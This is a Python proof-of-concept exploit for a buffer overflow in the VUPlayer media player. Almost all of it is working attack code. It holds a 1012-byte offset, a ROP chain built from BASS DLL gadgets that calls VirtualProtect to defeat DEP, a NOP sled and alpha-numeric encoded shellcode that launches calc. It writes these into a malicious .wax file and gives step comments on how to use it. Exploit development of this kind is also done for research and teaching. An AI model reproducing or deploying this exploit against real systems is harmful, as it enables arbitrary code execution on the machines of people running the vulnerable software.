from struct import pack
import struct

# Log data, item 12
# Address=1010539F
# Message=  0x1010539f : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASSWMA.dll)

#   1. Find buffer overflow when loading a .wax, .msu, or really any time of file into the program
#   2. Calculate offset with generic cyclic pattern
#   3. Find JMP ESP - 0x1010539f from BASSWMA.dll
#   4. Add NOPSLED and shellcode with alpha_mixed to not deal with badchars
#   5. Pop calc

shellcode_calc =  ""
shellcode_calc += "\x89\xe7\xda\xc4\xd9\x77\xf4\x5e\x56\x59"
shellcode_calc += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode_calc += "\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
shellcode_calc += "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shellcode_calc += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
shellcode_calc += "\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode_calc += "\x49\x6c\x48\x68\x6f\x72\x75\x50\x75\x50"
shellcode_calc += "\x67\x70\x71\x70\x6e\x69\x6a\x45\x30\x31"
shellcode_calc += "\x39\x50\x65\x34\x6e\x6b\x56\x30\x30\x30"
shellcode_calc += "\x6e\x6b\x32\x72\x36\x6c\x6e\x6b\x42\x72"
shellcode_calc += "\x45\x44\x6c\x4b\x52\x52\x46\x48\x54\x4f"
shellcode_calc += "\x38\x37\x71\x5a\x74\x66\x64\x71\x79\x6f"
shellcode_calc += "\x6e\x4c\x67\x4c\x50\x61\x61\x6c\x54\x42"
shellcode_calc += "\x74\x6c\x61\x30\x4f\x31\x5a\x6f\x44\x4d"
shellcode_calc += "\x33\x31\x7a\x67\x6d\x32\x6a\x52\x32\x72"
shellcode_calc += "\x32\x77\x4c\x4b\x31\x42\x36\x70\x6c\x4b"
shellcode_calc += "\x51\x5a\x47\x4c\x6c\x4b\x50\x4c\x72\x31"
shellcode_calc += "\x50\x78\x68\x63\x77\x38\x35\x51\x7a\x71"
shellcode_calc += "\x72\x71\x6e\x6b\x50\x59\x31\x30\x37\x71"
shellcode_calc += "\x6e\x33\x4c\x4b\x50\x49\x77\x68\x59\x73"
shellcode_calc += "\x44\x7a\x70\x49\x6c\x4b\x77\x44\x4e\x6b"
shellcode_calc += "\x76\x61\x39\x46\x70\x31\x59\x6f\x4e\x4c"
shellcode_calc += "\x6b\x71\x38\x4f\x74\x4d\x77\x71\x6a\x67"
shellcode_calc += "\x34\x78\x59\x70\x70\x75\x49\x66\x75\x53"
shellcode_calc += "\x61\x6d\x68\x78\x37\x4b\x61\x6d\x34\x64"
shellcode_calc += "\x70\x75\x6a\x44\x70\x58\x4c\x4b\x46\x38"
shellcode_calc += "\x47\x54\x67\x71\x7a\x73\x35\x36\x4e\x6b"
shellcode_calc += "\x66\x6c\x30\x4b\x4c\x4b\x31\x48\x57\x6c"
shellcode_calc += "\x66\x61\x78\x53\x6e\x6b\x53\x34\x6c\x4b"
shellcode_calc += "\x45\x51\x48\x50\x6c\x49\x61\x54\x36\x44"
shellcode_calc += "\x57\x54\x51\x4b\x71\x4b\x30\x61\x42\x79"
shellcode_calc += "\x52\x7a\x30\x51\x69\x6f\x39\x70\x51\x4f"
shellcode_calc += "\x33\x6f\x30\x5a\x6c\x4b\x35\x42\x48\x6b"
shellcode_calc += "\x6c\x4d\x63\x6d\x50\x6a\x76\x61\x6c\x4d"
shellcode_calc += "\x6d\x55\x48\x32\x63\x30\x75\x50\x63\x30"
shellcode_calc += "\x62\x70\x31\x78\x54\x71\x4c\x4b\x50\x6f"
shellcode_calc += "\x6b\x37\x79\x6f\x5a\x75\x4d\x6b\x78\x70"
shellcode_calc += "\x6e\x55\x4f\x52\x76\x36\x50\x68\x69\x36"
shellcode_calc += "\x6c\x55\x6f\x4d\x4d\x4d\x69\x6f\x4b\x65"
shellcode_calc += "\x67\x4c\x54\x46\x73\x4c\x36\x6a\x4f\x70"
shellcode_calc += "\x59\x6b\x4d\x30\x70\x75\x46\x65\x6d\x6b"
shellcode_calc += "\x77\x37\x74\x53\x72\x52\x62\x4f\x62\x4a"
shellcode_calc += "\x73\x30\x50\x53\x49\x6f\x48\x55\x51\x73"
shellcode_calc += "\x70\x61\x52\x4c\x42\x43\x46\x4e\x71\x75"
shellcode_calc += "\x50\x78\x31\x75\x43\x30\x41\x41"

rop_chain = "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop_chain += "\x5c\xe2\x60\x10" #ptr to &VirtualProtect() [IAT BASSMIDI.dll]
rop_chain += "\xf1\xea\x01\x10" #MOV EAX,DWORD PTR DS:[EAX] # RTN [BASS.dll] 
rop_chain += "\x50\x09\x03\x10" #XCHG EAX,ESI # RETN [BASS.dll]
rop_chain += "\x0c\x80\x60\x10" #POP EBP # RETN 0x0C [BASSMIDI.dll]
rop_chain += "\x9f\x53\x10\x10" #& jmp esp BASSWMA.dll
rop_chain += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop_chain += "\x90"*12
rop_chain += "\xff\xfd\xff\xff" #201 in negative
rop_chain += "\xb4\x4d\x01\x10" #NEG EAX # RETN [BASS.dll]
rop_chain += "\x72\x2f\x03\x10" #XCHG EAX,EBX # RETN [BASS.dll] 
rop_chain += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop_chain += "\xc0\xff\xff\xff" #40 in negative
rop_chain += "\xb4\x4d\x01\x10" #NEG EAX # RETN [BASS.dll]
rop_chain += "\x6c\x8a\x03\x10" #XCHG EAX,EDX # RETN [BASS.dll]
rop_chain += "\x07\x10\x10\x10" #POP ECX # RETN [BASSWMA.dll]
rop_chain += "\x93\x83\x10\x10" #&Writable location [BASSWMA.dll]
rop_chain += "\x04\xdc\x01\x10" #POP EDI # RETN [BASS.dll]
rop_chain += "\x84\xa0\x03\x10" #RETN [BASS.dll]
rop_chain += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
rop_chain += "\x90"*4
rop_chain += "\xa5\xd7\x01\x10" #PUSHAD # RETN [BASS.dll]


payload  = "A" * 1012
payload += rop_chain
payload += "\x90" * 16
payload += shellcode_calc
#payload += "D" * (3000 - len(payload))

# Log data, item 8
# Address=0BADF00D
# Message= - Pattern h7Bh (0x68423768) found in cyclic pattern at position 1012

try:
    print("[x] Exploit POC for VUPlayer BOF\n")
    file_payload = open("vuplayer-evil.wax", 'w')
    print("[x] Creating a .wax file for out payload")
    file_payload.write(payload)
    print("[x] Writing malicious payload to .wax file")
    file_payload.close()
    print("[x] Copy the file contents to the author field on the application")
except:
    print("[!] Failed to create malicious .wax")
